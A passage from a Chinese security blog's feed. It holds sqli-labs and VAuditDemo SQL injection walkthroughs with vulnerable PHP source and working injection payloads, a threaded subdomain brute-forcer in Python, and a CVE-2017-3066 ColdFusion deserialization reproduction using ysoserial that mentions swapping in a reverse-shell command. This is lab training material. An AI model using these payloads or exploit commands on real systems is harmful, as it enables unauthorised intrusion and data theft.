echo &quot;&lt;br&gt;&quot;;        echo &quot;&lt;br&gt;&quot;;        echo &#39;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#39;;              echo &quot;&lt;/font&gt;&quot;;      }    else      {        echo &#39;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#39;;        //echo &quot;Try again looser&quot;;        print_r(mysql_error());        echo &quot;&lt;/br&gt;&quot;;        echo &quot;&lt;/br&gt;&quot;;        echo &quot;&lt;/br&gt;&quot;;        echo &#39;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#39;;            echo &quot;&lt;/font&gt;&quot;;      }}?&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;font size=&#39;4&#39; color= &quot;#33FFFF&quot;&gt;&lt;?phpecho &quot;Hint: The Username you input is escaped as : &quot;.$uname .&quot;&lt;br&gt;&quot;;echo &quot;Hint: The Password you input is escaped as : &quot;.$passwd .&quot;&lt;br&gt;&quot;;?&gt;&lt;/font&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>要求你进行登录：</p><pre><code>payload:%df&#39; or 1=1 %23</code></pre><p><img src="https://s2.ax1x.com/2019/02/03/kGAWgH.png" alt="kGAWgH.png"></p><p><b>第三十八关</b><br>怎么后面的都没有过滤…..<br>代码如下：</p><pre><code class="mysql">&lt;?phperror_reporting(0);include(&quot;../sql-connections/db-creds.inc&quot;);?&gt;&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;Less-38 **stacked Query**&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000000&quot;&gt;&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:23px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&lt;?php// take the variables if(isset($_GET[&#39;id&#39;])){$id=$_GET[&#39;id&#39;];//logging the connection parameters to a file for analysis.$fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);fclose($fp);// connectivity//mysql connections for stacked query examples.$con1 = mysqli_connect($host,$dbuser,$dbpass,$dbname);// Check connectionif (mysqli_connect_errno($con1)){    echo &quot;Failed to connect to MySQL: &quot; . mysqli_connect_error();}else{    @mysqli_select_db($con1, $dbname) or die ( &quot;Unable to connect to the database: $dbname&quot;);}$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;/* execute multi query */if (mysqli_multi_query($con1, $sql)){    /* store first result set */    if ($result = mysqli_store_result($con1))    {        if($row = mysqli_fetch_row($result))        {            echo &#39;&lt;font size = &quot;5&quot; color= &quot;#00FF00&quot;&gt;&#39;;                printf(&quot;Your Username is : %s&quot;, $row[1]);            echo &quot;&lt;br&gt;&quot;;            printf(&quot;Your Password is : %s&quot;, $row[2]);            echo &quot;&lt;br&gt;&quot;;            echo &quot;&lt;/font&gt;&quot;;        }//            mysqli_free_result($result);    }        /* print divider */    if (mysqli_more_results($con1))    {            //printf(&quot;-----------------\n&quot;);    }     //while (mysqli_next_result($con1));}else     {    echo &#39;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#39;;    print_r(mysqli_error($con1));    echo &quot;&lt;/font&gt;&quot;;      }/* close connection */mysqli_close($con1);}    else { echo &quot;Please input the ID as parameter with numeric value&quot;;}?&gt;&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;&lt;img src=&quot;../images/Less-38.jpg&quot; /&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>直接报错注入：</p><pre><code>payload:&#39; and updatexml(1,concat(0x7e,(select user()),0x7e),1)|&#39;1</code></pre><p><img src="https://s2.ax1x.com/2019/02/03/kGE4WF.md.png" alt="kGE4WF.md.png"></p><p><b>第三十九关</b><br>我看后面这几关是给你复习的<br>代码如下：</p><pre><code class="php">&lt;?phperror_reporting(0);include(&quot;../sql-connections/db-creds.inc&quot;);?&gt;&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;Less-39 **stacked Query Intiger type**&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000000&quot;&gt;&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:23px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&lt;?php// take the variables if(isset($_GET[&#39;id&#39;])){$id=$_GET[&#39;id&#39;];//logging the connection parameters to a file for analysis.$fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);fclose($fp);// connectivity//mysql connections for stacked query examples.$con1 = mysqli_connect($host,$dbuser,$dbpass,$dbname);// Check connectionif (mysqli_connect_errno($con1)){    echo &quot;Failed to connect to MySQL: &quot; . mysqli_connect_error();}else{    @mysqli_select_db($con1, $dbname) or die ( &quot;Unable to connect to the database: $dbname&quot;);}$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;/* execute multi query */if (mysqli_multi_query($con1, $sql)){    /* store first result set */    if ($result = mysqli_store_result($con1))    {        if($row = mysqli_fetch_row($result))        {            echo &#39;&lt;font size = &quot;5&quot; color= &quot;#00FF00&quot;&gt;&#39;;                printf(&quot;Your Username is : %s&quot;, $row[1]);            echo &quot;&lt;br&gt;&quot;;            printf(&quot;Your Password is : %s&quot;, $row[2]);            echo &quot;&lt;br&gt;&quot;;            echo &quot;&lt;/font&gt;&quot;;        }//            mysqli_free_result($result);    }        /* print divider */    if (mysqli_more_results($con1))    {            //printf(&quot;-----------------\n&quot;);    }     //while (mysqli_next_result($con1));}else     {    echo &#39;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#39;;    print_r(mysqli_error($con1));    echo &quot;&lt;/font&gt;&quot;;      }/* close connection */mysqli_close($con1);}    else { echo &quot;Please input the ID as parameter with numeric value&quot;;}?&gt;&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;&lt;img src=&quot;../images/Less-39.jpg&quot; /&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>payload</p><pre><code>http://127.0.0.1/sqli-labs-master/Less-39/?id=0%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=0x7573657273</code></pre><p><img src="https://s2.ax1x.com/2019/02/03/kGV9OA.md.png" alt="kGV9OA.md.png"></p><p><b>第四十关</b><br>无法正常回显，盲注即可<br>四十关代码如下：</p><pre><code class="php">&lt;?phperror_reporting(0);include(&quot;../sql-connections/db-creds.inc&quot;);?&gt;&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;Less-40 **stacked Query String type Blind**&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000000&quot;&gt;&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:23px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&lt;?php// take the variables if(isset($_GET[&#39;id&#39;])){$id=$_GET[&#39;id&#39;];//logging the connection parameters to a file for analysis.$fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);fclose($fp);// connectivity//mysql connections for stacked query examples.$con1 = mysqli_connect($host,$dbuser,$dbpass,$dbname);// Check connectionif (mysqli_connect_errno($con1)){    echo &quot;Failed to connect to MySQL: &quot; . mysqli_connect_error();}else{    @mysqli_select_db($con1, $dbname) or die ( &quot;Unable to connect to the database: $dbname&quot;);}$sql=&quot;SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;;/* execute multi query */if (mysqli_multi_query($con1, $sql)){    /* store first result set */    if ($result = mysqli_store_result($con1))    {        if($row = mysqli_fetch_row($result))        {            echo &#39;&lt;font size = &quot;5&quot; color= &quot;#00FF00&quot;&gt;&#39;;                printf(&quot;Your Username is : %s&quot;, $row[1]);            echo &quot;&lt;br&gt;&quot;;            printf(&quot;Your Password is : %s&quot;, $row[2]);            echo &quot;&lt;br&gt;&quot;;            echo &quot;&lt;/font&gt;&quot;;        }//            mysqli_free_result($result);    }        /* print divider */    if (mysqli_more_results($con1))    {            //printf(&quot;-----------------\n&quot;);    }     //while (mysqli_next_result($con1));}/* close connection */mysqli_close($con1);}    else { echo &quot;Please input the ID as parameter with numeric value&quot;;}?&gt;&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;&lt;img src=&quot;../images/Less-40.jpg&quot; /&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>payload”</p><pre><code>&#39;) and sleep(if((length(database())=8),1,4))|(&#39;1</code></pre><p><img src="https://s2.ax1x.com/2019/02/03/kGVH1g.md.png" alt="kGVH1g.md.png"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Subdomain-blasting</title>
      <link href="/posts/60937edf.html"/>
      <url>/posts/60937edf.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天撸了一个子域名爆破脚本，感觉学到了不少。由于刚刚这个傻逼电脑蓝屏，真是操了你的妈。所以截图可能较少<br><img src="https://images.900.tw/upload_file/40/content/d85aa4b9-58d4-c7eb-271a-c029074f4039.png" alt=""></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>先从github上撸了一发字典：<br>字典传送链：<a href="https://paste.ubuntu.com/p/GYT9gBr5XT/" target="_blank" rel="noopener">https://paste.ubuntu.com/p/GYT9gBr5XT/</a></p><p>思路如下：</p><pre><code>1.生成1-5级子域名，边生成边测试2.存活的子域名写入txt</code></pre><p>代码：</p><pre><code class="python">#author:九世#time:2019/2/1import requestsimport threadingimport osimport timedict=[]class Rkst:    def __init__(self,headers):        self.headers=headers    def shenc(self,file):            for k in file.readlines():                qc=&quot;&quot;.join(k.split(&#39;\n&#39;))                yield qc    def one_domain(self,ssl,url):        for q in dict:            urls=&#39;{}&#39;.format(ssl)+q+&#39;.&#39;+url            yield urls    def two_domain(self,ssl,url):        for v in dict:            for v2 in dict:                urls=&#39;{}&#39;.format(ssl)+v+&#39;.&#39;+v2+&#39;.&#39;+url                yield  urls    def san_domain(self,ssl,url):        for u in dict:            for u1 in dict:                for u2 in dict:                    urls=&#39;{}&#39;.format(ssl)+u+&#39;.&#39;+u1+&#39;.&#39;+u2+&#39;.&#39;+url                    yield urls    def si_domain(self,ssl,url):        for s in dict:            for s1 in dict:                for s2 in dict:                    for s3 in dict:                        urls=&#39;{}&#39;.format(ssl)+s+&#39;.&#39;+s1+&#39;.&#39;+s2+&#39;.&#39;+s3+&#39;.&#39;+url                        yield urls    def wu_domain(self,ssl,url):        for b in dict:            for b1 in dict:                for b2 in dict:                    for b3 in dict:                        for b4 in dict:                            urls=&#39;{}&#39;.format(ssl)+b+&#39;.&#39;+b1+&#39;.&#39;+b2+&#39;.&#39;+b3+&#39;.&#39;+b4+&#39;.&#39;+url                            yield urls    def bao(self,url):        try:            reqt=requests.get(url=url,headers=self.headers,timeout=3)            if reqt:                print(&#39;[+] Found domain:{}&#39;.format(url))                print(url,file=(&#39;save.txt&#39;,&#39;a&#39;))        except:            pass        lock.release() #Unlock the threadif __name__ == &#39;__main__&#39;:    headers={&#39;user-agent&#39;:&#39;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&#39;}    if os.path.exists(&#39;file/one.txt&#39;):        print(&#39;[+] Found dict.txt&#39;)    else:        print(&#39;[-] Not Found dict.txt...&#39;)        exit()    dk=open(&#39;file/one.txt&#39;,&#39;r&#39;)    user=input(&#39;domain&gt;:&#39;)    ssl=input(&#39;http/https&gt;:&#39;)    obj=Rkst(headers=headers)    if ssl==&#39;http&#39;:        ht=&#39;http://&#39;    elif ssl==&#39;https&#39;:        ht=&#39;https://&#39;    print(&#39;[!] Test the first level domain name&#39;)    for o in obj.shenc(dk):        dict.append(o)    lock=threading.BoundedSemaphore(100) #Set the thread to 100    print(&#39;[!] Write the generated first-level domain name to the list&#39;)    for y in obj.one_domain(ht,user):        lock.acquire() #Lock the thread        t = threading.Thread(target=obj.bao, args=(y,))        t.start()    print(&#39;[!] Write the generated second-level domain name to the list&#39;)    for y2 in obj.two_domain(ht,user):        lock.acquire()        t = threading.Thread(target=obj.bao, args=(y2,))        t.start()    print(&#39;[!] Write the generated third-level domain name to the list&#39;)    for y3 in obj.san_domain(ht,user):        lock.acquire()        t = threading.Thread(target=obj.bao, args=(y3,))        t.start()    print(&#39;[!] Write the generated four-level domain name to the list&#39;)    for y4 in obj.si_domain(ht,user):        lock.acquire()        t = threading.Thread(target=obj.bao, args=(y4,))        t.start()    print(&#39;[!] Write the generated five-level domain name to the list&#39;)    for y5 in obj.wu_domain(ht,user):        lock.acquire()        t = threading.Thread(target=obj.bao, args=(y5,))        t.start()</code></pre><p>我在这里加了线锁和指定线程，当然你可以自己更改。这里的默认线程为100<br>如果不加线锁和指定线程的话会出现以下情况：<br><img src="https://s2.ax1x.com/2019/02/03/k8vqaj.md.jpg" alt="k8vqaj.md.jpg"></p><p>测试如下：<br><img src="https://s2.ax1x.com/2019/02/03/k8xFo9.png" alt="k8xFo9.png"></p><p>内存情况如下：<br><img src="https://s2.ax1x.com/2019/02/03/k8xQdH.png" alt="k8xQdH.png"></p><p>学到的：</p><pre><code>解决方法：设置好线程，然后在每个多线程执行之前加个线锁。在运行完指定函数后释放线锁。设置指定线程数量的文章：https://blog.csdn.net/xkou/article/details/131051设置指定线程数量用到的函数：lock=threading.BoundedSemaphore(指定线程)线锁：lock.acquire() 解锁：lock.release()</code></pre><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>VAuditDemo shooting range message search injection</title>
      <link href="/posts/cc7f1a76.html"/>
      <url>/posts/cc7f1a76.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>吃饭先撸了一发代码审计，感觉还行。就是VAuditDemo这个靶场，下午看基友在哪里撸注入，自己也整了个注入。<br><img src="http://5b0988e595225.cdn.sohucs.com/images/20181116/858694dcc64249db8e00da755006a13a.jpeg" alt="858694dcc64249db8e00da755006a13a.jpeg"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>我撸的这个是在留言搜索哪里的注入，先看代码</p><pre><code class="php">&lt;?phpinclude_once &#39;sys/config.php&#39;;include_once &#39;header.php&#39;;if ( !empty( $_GET[&#39;search&#39;] ) ) {    $query = &quot;SELECT * FROM comment WHERE comment_text LIKE &#39;%{$_GET[&#39;search&#39;]}%&#39;&quot;; /*这里直接带入了参数，并没有过滤所以造成注入*/    echo $query;    $data = mysql_query($query, $conn);?&gt;&lt;div class=&quot;bs-example table-responsive&quot;&gt;    &lt;?php echo &#39;The result for [ &#39;.$_GET[&#39;search&#39;].&#39; ] is:&#39;?&gt;    &lt;table class=&quot;table table-striped table-hover &quot;&gt;    &lt;tr&gt;        &lt;th&gt;#&lt;/th&gt;        &lt;th&gt;Column heading&lt;/th&gt;    &lt;/tr&gt;    &lt;?php    while ( $com = mysql_fetch_array( $data ) ) {        //净化输出变量        $html[&#39;username&#39;] = htmlspecialchars( $com[&#39;user_name&#39;] );        $html[&#39;comment_text&#39;] = htmlspecialchars( $com[&#39;comment_text&#39;] );        echo &#39;&lt;tr&gt;&#39;;        echo &#39;&lt;td&gt;&#39;.$html[&#39;username&#39;].&#39;&lt;/td&gt;&#39;;        echo &#39;&lt;td&gt;&lt;a href=&quot;messageDetail.php?id=&#39;.$com[&#39;comment_id&#39;].&#39;&quot;&gt;&#39;.$html[&#39;comment_text&#39;].&#39;&lt;/a&gt;&lt;/td&gt;&#39;;        echo &#39;&lt;/tr&gt;&#39;;    }    ?&gt;    &lt;/table&gt;&lt;/div&gt;    &lt;?php    if ( isset( $_SESSION[&#39;username&#39;] ) ) {    ?&gt;&lt;form action=&quot;messageSub.php&quot; method=&quot;post&quot; name=&quot;message&quot;&gt;    &lt;div class=&quot;col-lg-10&quot;&gt;        &lt;textarea class=&quot;form-control&quot; rows=&quot;3&quot; id=&quot;textArea&quot; name=&quot;message&quot;&gt;&lt;/textarea&gt;    &lt;/div&gt;    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;留言&quot;/&gt;&lt;/form&gt;&lt;a href=&quot;user/user.php&quot;&gt;返回&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;?php    }}require_once &#39;footer.php&#39;;?&gt;</code></pre><p>从上面代码可以看到，并没有对搜索处进行过滤就直接带入数据库查询了，我们首先向数据库插入<br>一条留言<br><img src="https://s2.ax1x.com/2019/02/01/k35bwT.png" alt="k35bwT.png"></p><p>然后进行搜索并尝试注入：<br><img src="https://s2.ax1x.com/2019/02/01/k35OkF.png" alt="k35OkF.png"></p><p>根据SQL查询语句注入语句如下：</p><pre><code class="sql">%90&#39; and 1=1 |&#39;%1 页面返回正常%90’ and 1=2 |%2 页面返回错误</code></pre><p><img src="https://s2.ax1x.com/2019/02/01/k3IpOx.png" alt=""></p><p><img src="https://s2.ax1x.com/2019/02/01/k3ICm6.md.png" alt="k3ICm6.md.png"></p><p>那么接下来盲注即可</p><pre><code class="mysql">%90&#39; and(length(database())=4) |&#39;%1 这里我的数据库名叫demo%90&#39; and(left(database(),4)=&quot;demo&quot;) |&#39;%1 页面返回正常</code></pre><p><img src="https://s2.ax1x.com/2019/02/01/k3IiTO.png" alt=""></p><p><img src="https://s2.ax1x.com/2019/02/01/k3oMvR.md.png" alt="k3oMvR.md.png"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Reproduction of CVE-2017-3066</title>
      <link href="/posts/8129983d.html"/>
      <url>/posts/8129983d.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>继续复现CVE漏洞<br><img src="http://5b0988e595225.cdn.sohucs.com/images/20180510/5c5977424262470b91df6257318adc2e.jpeg" alt="5c5977424262470b91df6257318adc2e.jpeg"></p><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>Adobe ColdFusion是美国Adobe公司的一款动态Web服务器产品，其运行的CFML（ColdFusion Markup Language）是针对Web应用的一种程序设计语言。</p><p>Adobe ColdFusion中存在java反序列化漏洞。攻击者可利用该漏洞在受影响应用程序的上下文中执行任意代码或造成拒绝服务。以下版本受到影响：Adobe ColdFusion (2016 release) Update 3及之前的版本，ColdFusion 11 Update 11及之前的版本，ColdFusion 10 Update 22及之前的版本。</p><p>参考链接：</p><p><a href="https://codewhitesec.blogspot.com.au/2018/03/exploiting-adobe-coldfusion.html" target="_blank" rel="noopener">https://codewhitesec.blogspot.com.au/2018/03/exploiting-adobe-coldfusion.html</a></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>启动漏洞环境</p><pre><code>sudo docker-compose up -d</code></pre><p>等待环境搭建完成后，访问<a href="http://127.0.0.1:8500/CFIDE/administrator/index.cfm，输入密码vulhub，即可成功安装Adobe" target="_blank" rel="noopener">http://127.0.0.1:8500/CFIDE/administrator/index.cfm，输入密码vulhub，即可成功安装Adobe</a> ColdFusion。</p><p><img src="https://s2.ax1x.com/2019/02/01/k3aUIS.md.png" alt="k3aUIS.md.png"></p><p><img src="https://s2.ax1x.com/2019/02/01/k3adPg.png" alt="k3adPg.png"></p><p><img src="https://s2.ax1x.com/2019/02/01/k3a02j.md.png" alt="k3a02j.md.png"></p><p>我们使用参考链接中的<a href="https://github.com/codewhitesec/ColdFusionPwn" target="_blank" rel="noopener">GitHub - codewhitesec/ColdFusionPwn: Exploitation Tool for CVE-2017-3066 targeting Adobe Coldfusion 11/12</a>工具来生成POC：</p><pre><code>java -cp ColdFusionPwn-0.0.1-SNAPSHOT-all.jar:ysoserial-0.0.6-SNAPSHOT-all.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -e CommonsBeanutils1 &#39;touch /tmp/success&#39; poc.ser</code></pre><p>POC生成于poc.ser文件中，将POC作为数据包body发送给<a href="http://127.0.0.1:8500/flex2gateway/amf，Content-Type为application/x-amf：" target="_blank" rel="noopener">http://127.0.0.1:8500/flex2gateway/amf，Content-Type为application/x-amf：</a></p><pre><code>POST /flex2gateway/amf HTTP/1.1Host: 127.0.0.1.:8500Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-amfContent-Length: 2853</code></pre><p><img src="https://s2.ax1x.com/2019/02/01/k3aWiF.png" alt="k3aWiF.png"></p><p><img src="https://s2.ax1x.com/2019/02/01/k3aIMR.png" alt="k3aIMR.png"></p><p>进入容器中，发现/tmp/success已成功创建：<br><img src="https://s2.ax1x.com/2019/02/01/k3abdK.png" alt="k3abdK.png"><br>改成反弹shell的命令即可获取shell<br>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sqli-labs Less 31 -&gt; sqli-labse Less 35</title>
      <link href="/posts/a58fa3c8.html"/>
      <url>/posts/a58fa3c8.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>今天从sqli-labs Less 31关撸到了35关，感觉很好，这几关是宽字节注入。就是数据库设置编码为GBK，因为gbk编码加上程序本身过滤特殊字符添加反斜杆。会造成一个繁体字：連，导致可以逃逸注入漏洞<br><img src="http://img3.xiazaizhijia.com/walls/20151130/middle_bf818e420c6c9fe.jpg" alt="middle_bf818e420c6c9fe.jpg"></p><h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p><b>第三十一关</b><br>首先看三十一关代码</p><pre><code class="php">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;Less-31 FUN with WAF&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000000&quot;&gt;&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:40px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);// take the variables if(isset($_GET[&#39;id&#39;])) /*如果$_GET[id]存在则执行以下*/{    $id=$_GET[&#39;id&#39;];    //logging the connection parameters to a file for analysis.    $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);    fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);    fclose($fp);    $qs = $_SERVER[&#39;QUERY_STRING&#39;]; /*query string（查询字符串），如果有的话，通过它进行页面访问*/    $hint=$qs;    $id = &#39;&quot;&#39;.$id.&#39;&quot;&#39;;// connectivity     $sql=&quot;SELECT * FROM users WHERE id= ($id) LIMIT 0,1&quot;;    $result=mysql_query($sql);    $row = mysql_fetch_array($result);    if($row)    {          echo &quot;&lt;font size=&#39;5&#39; color= &#39;#99FF00&#39;&gt;&quot;;              echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];          echo &quot;&lt;br&gt;&quot;;          echo &#39;Your Password:&#39; .$row[&#39;password&#39;];          echo &quot;&lt;/font&gt;&quot;;      }    else     {        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;        print_r(mysql_error());        echo &quot;&lt;/font&gt;&quot;;      }}    else { echo &quot;Please input the ID as parameter with numeric value&quot;;}?&gt;&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;&lt;img src=&quot;../images/Less-31.jpg&quot; /&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;img src=&quot;../images/Less-31-1.jpg&quot; /&gt;&lt;/br&gt;&lt;/br&gt;&lt;font size=&#39;4&#39; color= &quot;#33FFFF&quot;&gt;&lt;?phpecho &quot;Hint: The Query String you input is: &quot;.$hint;?&gt;&lt;/font&gt; &lt;/center&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>可以看到在带入数据库查询之前，这个在前后加了个双引号。闭合就是<br>得出的payload</p><pre><code>http://127.0.0.1/sqli-labs-master/Less-31/?id=1&quot;) and 1=2 |(&quot;</code></pre><p><img src="https://s2.ax1x.com/2019/01/31/k1yyoq.md.png" alt="k1yyoq.md.png"></p><p><b>第三十二关</b><br>代码如下：</p><pre><code class="php">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;Less-32 **Bypass addslashes()**&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000000&quot;&gt;&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:23px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;font size=&quot;5&quot; color=&quot;#00FF00&quot;&gt;&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);function check_addslashes($string){    $string = preg_replace(&#39;/&#39;. preg_quote(&#39;\\&#39;) .&#39;/&#39;, &quot;\\\\\\&quot;, $string);          //escape any backslash    $string = preg_replace(&#39;/\&#39;/i&#39;, &#39;\\\&#39;&#39;, $string);                               //escape single quote with a backslash    $string = preg_replace(&#39;/\&quot;/&#39;, &quot;\\\&quot;&quot;, $string);                                //escape double quote with a backslash    return $string;}// take the variables if(isset($_GET[&#39;id&#39;])){$id=check_addslashes($_GET[&#39;id&#39;]);//echo &quot;The filtered request is :&quot; .$id . &quot;&lt;br&gt;&quot;;//logging the connection parameters to a file for analysis.$fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);fclose($fp);// connectivity mysql_query(&quot;SET NAMES gbk&quot;); /*将数据库设置为GBK编码引起的注入*/$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);    if($row)    {      echo &#39;&lt;font color= &quot;#00FF00&quot;&gt;&#39;;          echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];      echo &quot;&lt;br&gt;&quot;;      echo &#39;Your Password:&#39; .$row[&#39;password&#39;];      echo &quot;&lt;/font&gt;&quot;;      }    else     {    echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;    print_r(mysql_error());    echo &quot;&lt;/font&gt;&quot;;      }}    else { echo &quot;Please input the ID as parameter with numeric value&quot;;}?&gt;&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;&lt;img src=&quot;../images/Less-32.jpg&quot; 